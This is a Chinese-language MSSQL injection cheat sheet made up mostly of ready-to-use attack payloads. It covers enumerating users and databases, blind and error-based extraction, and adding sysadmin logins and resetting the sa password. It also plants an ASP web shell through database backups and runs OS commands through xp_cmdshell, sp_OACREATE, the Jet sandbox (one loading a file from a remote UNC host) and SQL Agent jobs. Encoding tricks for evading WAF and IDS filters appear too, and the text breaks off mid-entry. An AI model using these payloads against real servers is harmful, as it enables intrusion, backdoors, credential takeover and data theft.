# MSSQL注射知识库 v 1.0

### 默认数据库

<table style="box-sizing: border-box; border-collapse: separate; border-spacing: 0px; background-color: rgb(255, 255, 255); border-top: 1px solid rgb(224, 224, 224); border-left: 1px solid rgb(224, 224, 224); font-family: Helvetica, Arial, &quot;Hiragino Sans GB&quot;, sans-serif; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">pubs</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">不适用于MSSQL 2005</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">model</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">适用于所有版本</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">msdb</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">适用于所有版本</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">tempdb</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">适用于所有版本</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">northwind</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">适用于所有版本</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">information_schema</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">适用于MSSQL 2000及更高版本</td></tr></tbody></table>

### 注释掉查询

下面可以用来注释掉你注射后查询的其余部分：

<table style="box-sizing: border-box; border-collapse: separate; border-spacing: 0px; background-color: rgb(255, 255, 255); border-top: 1px solid rgb(224, 224, 224); border-left: 1px solid rgb(224, 224, 224); font-family: Helvetica, Arial, &quot;Hiragino Sans GB&quot;, sans-serif; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">/ *</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">C语言风格注释</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">--</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">SQL注释</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">; 00％</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">空字节</td></tr></tbody></table>

示例：

```
SELECT * FROM Users WHERE username = '' OR 1=1 --' AND password = '';
SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3/*';

```

### 测试版本：

```
@@VERSION

```

示例：

如果MSSQL的版本是2008

```
SELECT * FROM Users WHERE id = '1' AND @@VERSION LIKE '%2008%';

```

附：输出结果包含Windows操作系统的版本。

### 数据库凭据

<table style="box-sizing: border-box; border-collapse: separate; border-spacing: 0px; background-color: rgb(255, 255, 255); border-top: 1px solid rgb(224, 224, 224); border-left: 1px solid rgb(224, 224, 224); font-family: Helvetica, Arial, &quot;Hiragino Sans GB&quot;, sans-serif; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">数据库表</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">master..syslogins, master..sysprocesses</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">列名</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">name, loginame</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">当前用户</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">user, system_user, suser_sname(), is_srvrolemember('sysadmin')</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">数据库凭据</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">SELECT user, password FROM master.dbo.sysxlogins</td></tr></tbody></table>

示例：

#### 返回当前用户：

```
SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID;

```

#### 检查用户是否为admin：

```
SELECT (CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN '1' ELSE '0' END);

```

### 数据库名称

<table style="box-sizing: border-box; border-collapse: separate; border-spacing: 0px; background-color: rgb(255, 255, 255); border-top: 1px solid rgb(224, 224, 224); border-left: 1px solid rgb(224, 224, 224); font-family: Helvetica, Arial, &quot;Hiragino Sans GB&quot;, sans-serif; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">数据库表</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">master..sysdatabases</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">列</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">name</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">当前前数据库</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">DB_NAME(5)</td></tr></tbody></table>

示例：

```
SELECT **DB_NAME(5)**;
SELECT** name** FROM **master..sysdatabases**;

```

### 服务器主机名

```
@@SERVERNAME
SERVERPROPERTY()

```

示例：

```
SELECT SERVERPROPERTY('productversion'), SERVERPROPERTY('productlevel'), SERVERPROPERTY('edition');

```

附：

```
SERVERPROPERTY()    适用于MSSQL 2000及更高版本。

```

### 表和列

确定列数

```
ORDER BY n+1;

```

示例： 查询语句:

```
SELECT username, password, permission FROM Users WHERE id = '1';

```

<table style="box-sizing: border-box; border-collapse: separate; border-spacing: 0px; background-color: rgb(255, 255, 255); border-top: 1px solid rgb(224, 224, 224); border-left: 1px solid rgb(224, 224, 224); font-family: Helvetica, Arial, &quot;Hiragino Sans GB&quot;, sans-serif; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">1' ORDER BY 1--</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">True</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">1' ORDER BY 2--</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">True</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">1' ORDER BY 3--</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">True</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">1' ORDER BY 4--</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">False - 列数为3</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">-1' UNION SELECT 1,2,3--</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">True</td></tr></tbody></table>

附： 不断递增的列数，直到得到一个错误的响应。

### GROUP BY / HAVING 获​取当前查询的列名

示例： 给出的查询：

```
SELECT username, password, permission FROM Users WHERE id = '1';

```

<table style="box-sizing: border-box; border-collapse: separate; border-spacing: 0px; background-color: rgb(255, 255, 255); border-top: 1px solid rgb(224, 224, 224); border-left: 1px solid rgb(224, 224, 224); font-family: Helvetica, Arial, &quot;Hiragino Sans GB&quot;, sans-serif; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">1' HAVING 1=1--</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">选择列表中的列 'Users.username' 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">1' GROUP BY username HAVING 1=1--</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">True</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">选择列表中的列 'Users.username' 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">True</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">1' GROUP BY username, password HAVING 1=1--</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">选择列表中的列 'Users.username' 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">1' GROUP BY username, password, permission HAVING 1=1--</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">没有错误</td></tr></tbody></table>

附：一旦匹配所有的列将返回正常请求页面.

### 检索表

我们可以从两个不同的数据库，`information_schema.tables`或`from master..sysobjects`中检索表。

### 联合查询:

```
UNION SELECT name FROM master..sysobjects WHERE xtype='U'

```

附：

```
U = 用户表, V = 视图 , X = 扩展存储过程

```

### 盲注类型：

```
AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'

```

### 报错类型:

```
AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)
AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))

```

### 检索列

我们可以从两个不同的数据库，`information_schema.columns`或`masters..syscolumns`中检索列。

### 联合查询:

```
UNION SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = 'tablename')

```

### 盲注类型:

```
AND SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns > 'A'

```

### 报错类型:

```
AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns)
AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns))

```

### 一次性检索多个表

下面的3个查询将创建一个临时表/列 并插入所有用户定义的表，然后把表的内容进行转储并删除

创建临时表/列和插入数据：

```
AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @xy=@xy+' '+name FROM sysobjects WHERE xtype='U' AND name>@xy SELECT @xy AS xy INTO TMP_DB END;

```

转储内容：

```
AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB);

```

删除表：

```
AND 1=0; DROP TABLE TMP_DB;

```

MSSQL2005及更高版本中使用xml for path 函数作为连接符，可一次性查询所有表。

```
SELECT table_name %2b ', ' FROM information_schema.tables FOR XML PATH('')        SQL Server 2005+

```

附： 代码可以用十六进制进行混淆

```
' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);--

```

避免引用序号

```
SELECT * FROM Users WHERE username = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)

```

字符串连接

```
SELECT CONCAT('a','a','a'); (SQL SERVER 2012)
SELECT 'a'+'d'+'mi'+'n';

```

### 条件语句

```
IF
CASE

```

示例：

```
IF 1=1 SELECT 'true' ELSE SELECT 'false';
SELECT CASE WHEN 1=1 THEN true ELSE false END;

```

附：IF不能在SELECT语句中使用。

### 时间延迟:

```
WAITFOR DELAY 'time_to_pass';
WAITFOR TIME 'time_to_execute';

```

示例：

```
IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';

```

### OPENROWSET攻击

```
SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'p4ssw0rd', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"');

```

OPENROWSET 在MSSQL 2005及以上版本中默认是禁用的.

激活OPENROWSET的语句：

```
exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;

```

### 添加数据库用户

```
exec sp_addlogin 'name' , 'password'
exec sp_addsrvrolemember 'name' , 'sysadmin'       加为数据库管理员

```

**修改sa用户密码**

```
EXEC sp_password NULL,'NewPassword','sa'           (适用于SQL2000及以上)
alter login [sa] with password=N'NewPassword'      (适用于SQL2005及以上)
;exec master.dbo.sp_password null,username,password;-- 

```

### Get WebShell

差异备份: 创建差异数据库备份需要有以前的完整数据库备份。 如果选定的数据库从未进行过备份，则请在创建任何差异备份之前，先执行完整数据库备份。

#### 方法1

```
backup database 库名 to disk = 'c:\tmp.bak';create table [dbo].[test_tmp] ([cmd] [image]);insert into  test_tmp(cmd) values(0x3C25657865637574652872657175657374282261222929253E);backup database 库名 to disk='c:\shell.asp' WITH DIFFERENTIAL,FORMAT;

```

#### 方法2 (减小体积)

```
alter database web1 set RECOVERY FULL;create table  test_tmp  (a image);backup log web1 to disk = 'c:\cmd' with init;insert into test_tmp (a) values (0x3C25657865637574652872657175657374282261222929253EDA);backup log web1 to disk = 'c:\shell.asp'--

```

*0x3C25657865637574652872657175657374282261222929253E = <%execute(request("a"))%>

#### sp_makewebtask 备份(需sa权限)

```
exec sp_makewebtask 'c:\shell.asp',' select ''<%25execute(request("a"))%25>'' ';

```

注：sp_makewebtask存储过程在MSSQL 2005及以上版本中默认是禁用的

激活 sp_makewebtask存储过程的语句:

```
exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Web Assistant Procedures',1;RECONFIGURE;  

```

### 系统命令执行

#### 1. 使用xp_cmdshell存储过程执行操作系统命令。

```
EXEC master.dbo.xp_cmdshell 'cmd';

```

`xp_cmdshell`存储过程在MSSQL 2005及以上版本中默认是禁用的.

激活`xp_cmdshell`存储过程的语句:

```
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;

```

检查是否xp_cmdshell是否加载，如果是,将继续检查是否处于活动状态，然后继续执行“DIR”命令并将结果插入到TMP_DB表中：

#### 示例：

```
' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='TMP_DB') DROP TABLE TMP_DB DECLARE @a varchar(8000) IF EXISTS(SELECT * FROM dbo.sysobjects WHERE id = object_id (N'[dbo].[xp_cmdshell]') AND OBJECTPROPERTY (id, N'IsExtendedProc') = 1) BEGIN CREATE TABLE %23xp_cmdshell (name nvarchar(11), min int, max int, config_value int, run_value int) INSERT %23xp_cmdshell EXEC master..sp_configure 'xp_cmdshell' IF EXISTS (SELECT * FROM %23xp_cmdshell WHERE config_value=1)BEGIN CREATE TABLE %23Data (dir varchar(8000)) INSERT %23Data EXEC master..xp_cmdshell 'dir' SELECT @a='' SELECT @a=Replace(@a%2B'<br></font><font color="black">'%2Bdir,'<dir>','</font><font color="orange">') FROM %23Data WHERE dir>@a DROP TABLE %23Data END ELSE SELECT @a='xp_cmdshell not enabled' DROP TABLE %23xp_cmdshell END ELSE SELECT @a='xp_cmdshell not found' SELECT @a AS tbl INTO TMP_DB--

```

转储内容:

```
' UNION SELECT tbl FROM TMP_DB--

```

删除表:

```
' DROP TABLE TMP_DB--

```

#### 2.利用sp_OACREATE和sp_OAMethod调用控件执行系统命令:

```
DECLARE @execmd INT EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe [[/c]]   ver >C:\inetpub\wwwroot\test.txt'

```

`sp_oacreate`存储过程在MSSQL 2005及以上版本中默认是禁用的.

激活 sp_oacreate 存储过程的语句:

```
exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;

```

附:SQL Server 提供了sp_OACREATE和sp_OAMethod函数,可以利用这两个函数调用OLE控件，间接获取一个shell。使用SP_OAcreate调用对象wscript。shell赋给变量@shell，然后使用SP_OAMETHOD调用@shell的属性run执行命令。

#### 3.JET 沙盒模式执行系统命令(Sandbox Mode)

在默认情况下Jet数据引擎不支持select shell("net user ")这样的SQL语句，必须开启JET引擎的沙盒模式才能执行命令，先利用`xp_regwrite`存储过程改写注册表，然后利用OpenRowSet访问一个ACCESS数据库文件，再执行运行命令的SQL语句。

激活沙盒模式:

Windows 2003

```
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;--

```

Windows 2008 R2

```
exec  master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Wow6432Node\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0; 

```

Windows 2003 + SQL Server2000 沙盒模式执行命令的语句:

（Windows 2003 系统c:\windows\system32\ias\目录下默认自带了2个Access数据库文件ias.mdb/dnary.mdb,所以直接调用即可.）

```
select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user  >c:\test.txt ")');

```

Windows 2008 R2+SQL Server2005 沙盒模式执行命令的语句:

（ Windows 2008 R2 默认无Access数据库文件,需要自己上传,或者用UNC路径加载文件方能执行命令.）

```
select * from openrowset('microsoft.jet.oledb.4.0',';database=\\192.168.1.8\file\ias.mdb','select shell("c:\windows\system32\cmd.exe /c net user  >c:\test.txt ")');

```

（ SQL Server2008 默认未注册microsoft.jet.oledb.4.0接口,所以无法利用沙盒模式执行系统命令.）

#### 4.OPENROWSET调用xp_cmdshell 执行系统命令:

（在知道sa权限帐号密码情况下,db_owner或者public的数据库权限使用OPENROWSET调用xp_cmdshell 执行系统命令.）

```
SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'p4ssw0rd', 'SET FMTONLY OFF execute master..xp_cmdshell "ver"');

```

### 小技巧:

使用 for xml 实现执行内容回显:

<table style="box-sizing: border-box; border-collapse: separate; border-spacing: 0px; background-color: rgb(255, 255, 255); border-top: 1px solid rgb(224, 224, 224); border-left: 1px solid rgb(224, 224, 224); font-family: Helvetica, Arial, &quot;Hiragino Sans GB&quot;, sans-serif; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">for xml raw/auto</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">适用于SQL Server 2000及以上版本 **(**附**:此法只能取首行数据,问题待解决.)**</td></tr></tbody></table>

```
or 1 in(SELECT * FROM OPENROWSET('SQLOLEDB', 'trusted_connection=yes', 'SET FMTONLY OFF execute master..xp_cmdshell "set"'))for xml raw
or 1 in(SELECT * FROM OPENROWSET('SQLOLEDB', 'trusted_connection=yes', 'SET FMTONLY OFF execute master..xp_cmdshell "set"'))for xml auto

```

<table style="box-sizing: border-box; border-collapse: separate; border-spacing: 0px; background-color: rgb(255, 255, 255); border-top: 1px solid rgb(224, 224, 224); border-left: 1px solid rgb(224, 224, 224); font-family: Helvetica, Arial, &quot;Hiragino Sans GB&quot;, sans-serif; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">for xml path</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">适用于SQL Server 2005及以上版本,虽然是一次性获取所有内容,但是取出内容数量取决于表定义的长度.</td></tr></tbody></table>

```
SELECT * FROM OPENROWSET('SQLOLEDB', 'trusted_connection=yes', 'SET FMTONLY OFF execute master..xp_cmdshell "ver"') for xml path  
SELECT * FROM OPENROWSET('SQLOLEDB', '192.168.1.117';'sa';'123456', 'SET FMTONLY OFF execute master..xp_cmdshell "ver"')for xml path

```

附:

回显内容超过表定义长度将会出现内容为 "将截断字符串或二进制数据。"的错误

### 5.SQL代理执行系统命令(SQLSERVERAGENT):

```
use msdb exec sp_delete_job null,'x';exec sp_add_job 'x';exec sp_add_jobstep Null,'x',Null,'1','CMDEXEC','cmd /c  net start >C:\test.txt';exec sp_add_jobserver Null,'x',@@servername exec sp_start_job 'x';

```

（SQLSERVERAGENT服务默认是禁用的,先利用xp_servicecontrol激活SQLSERVERAGENT，然后建立一个SQL计划任务马上运行这个SQL任务实现命令执行。）

激活SQLSERVERAGENT的语句:

```
exec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT'

```

### 其他获取系统信息的函数

**1.历遍目录**

```
exec master.dbo.xp_dirtree 'c:\'

```

**2.获取子目录**

```
exec master.dbo.xp_subdirs 'c:\'

```

**3.列举可用的系统分区**

```
exec master.dbo.xp_availablemedia

```

**4.判断目录或文件是否存在**

```
exec master..xp_fileexist 'c:\boot.ini'

```

### SP_PASSWORD （隐藏查询）

在查询结束后追加sp_password,T-SQL日志作为一项安全措施隐藏它。

### SP_PASSWORD

Example:

' AND 1=1--sp_password

输出：

```
-- 'sp_password的'在该事件文本中被发现。('sp_password' was found in the text of this event.)
-- 出于安全原因,该文本已被替换成注释。( The text has been replaced with this comment for security reasons.)

```

*   这个方法不理解,望小伙伴们解答.

### 层叠查询

（ MSSQL支持 层叠查询）

示例：

```
' AND 1=0 INSERT INTO ([column1], [column2]) VALUES ('value1', 'value2');

```

### 模糊测试和混淆

允许中间字符

以下字符可以作为空格符。

![enter image description here](http://drops.javaweb.org/uploads/images/8fa01aade58721e9a78b9e76d838849b147e8188.jpg)

#### 示例：

```
S%E%L%E%C%T%01column%02FROM%03table;
A%%ND 1=%%%%%%%%1;

```

附： 关键词之间的百分比符号只在ASP(X)的Web应用程序中有效。

下面的字符也可用来避免空格。

```
22    "
28   （
29    ）
5B    [
5D    ]

```

#### 示例：

```
UNION(SELECT(column)FROM(table));
SELECT"table_name"FROM[information_schema].[tables];

```

AND/OR可以使用中间符号:

```
01 - 20 范围
21  !
2B  +
2D  -
2E  .
5C  \
7E  ~

```

示例：

```
SELECT 1FROM[table]WHERE\1=\1AND\1=\1;

```

附： 反斜杠似乎不适用于MSSQL 2000中.

### 编码

编码注射语句，有利于躲避WAF / IDS检查。

<table style="box-sizing: border-box; border-collapse: separate; border-spacing: 0px; background-color: rgb(255, 255, 255); border-top: 1px solid rgb(224, 224, 224); border-left: 1px solid rgb(224, 224, 224); font-family: Helvetica, Arial, &quot;Hiragino Sans GB&quot;, sans-serif; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">URL编码(URL Encoding)</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">SELECT %74able_%6eame FROM information_schema.tables;</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">双重URL编码(Double URL Encoding)</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">SELECT %2574able_%256eame FROM information_schema.tables;</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">Unicode编码(Unicode Encoding)</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">SELECT %u0074able_%u6eame FROM information_schema.tables;</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">无效的十六进制编码(Invalid Hex Encoding (ASP)</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">SELECT %tab%le_%na%me FROM information_schema.tables;</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">十六进制编码(Hex Encoding)</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">' AND 1=0; DECLARE @S VARCHAR(4000) SET 